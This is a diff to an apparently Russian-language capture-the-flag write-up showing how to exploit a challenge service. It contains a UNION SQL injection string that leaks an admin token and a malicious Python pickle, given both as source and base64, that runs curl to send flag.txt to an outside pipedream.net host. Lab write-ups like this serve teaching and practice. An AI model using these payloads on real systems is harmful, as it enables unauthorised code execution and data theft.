@@ -79,15 +79,39 @@ python3 client.py
 # Chcfg(cfgname:string, cfgvalue:json) - Remotely change configuration, changes may require restart (better use local menu)
 ```
 
+5. Среди методов интерфейса замечаем "DisablePickleCheck", который отключает проверку пиклов перед загрузкой, но он требует токен администратора.
+Функция GetObjectList возвращает объекты пользователя по его токену. Все условия располагают к SQLi - ее и пробуем обнаружить и проэксплуатировать, что
+```python
+#...
+print(public_proxed.GetObjectList("b7482935-4ed1-4f53-b123-442d49b3c2b6' UNION SELECT uid FROM users where username='admin'--"))
+```
 
-5. Среди методов интерфейса замечаем "DisablePickleCheck", который отключает проверку пиклов перед загрузкой, но он требует токен администратора. Функция GetObjectList возвращает объекты пользователя по его токену. Все условия располагают к SQLi - ее и пробуем обнаружить и проэксплуатировать.
-6. Используя интерфейс `Public` и метод `CreateFreeUser` создаем новго пользователя и получаем его токен.
-7. В GetObjectList есть UNION-скуля, эксплуатируем ее, получаем токен админа
-8. Вызываем DisablePickleCheck с токеном админа
-9. Делаем базовый pickle-payload на ревшелл / отстук через curl и закидываем
-10. Вы великолепны - читаем флаг!
+```bash
+python3 client.py
+#[(None,), ('775b3ad3-b3d5-4d57-a5af-868b42d46fab',)]
+```
 
-[Решение, с помощью Python](solve/solve.py).
+6. Используя полученый токен администратора отключаем picklescan и загружаем пейлоуд, предварительно его собрав и получаем отстук с флагом на веб-сервере или RCE-шимся на тачку:
+```python
+#payload.py
+import pickle
+import os
+import base64
+class MaliciousPayload:
+    def __reduce__(self):
+        return (os.system, ('curl https://eo2vivpybd0wl6h.m.pipedream.net/$(cat flag.txt)',))
+        #return (print, ('abcd',))
+payload = MaliciousPayload()
+serialized_payload = pickle.dumps(payload)
+print(base64.urlsafe_b64encode(serialized_payload))
+```
+
+```python
+#client.py
+#...
+print(private_proxed.DisablePickleCheck("775b3ad3-b3d5-4d57-a5af-868b42d46fab"))
+print(public_proxed.PutObject("775b3ad3-b3d5-4d57-a5af-868b42d46fab","gASVVwAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjDxjdXJsIGh0dHBzOi8vZW8ydml2cHliZDB3bDZoLm0ucGlwZWRyZWFtLm5ldC8kKGNhdCBmbGFnLnR4dCmUhZRSlC4="))
+```
 
 ## Флаг
 
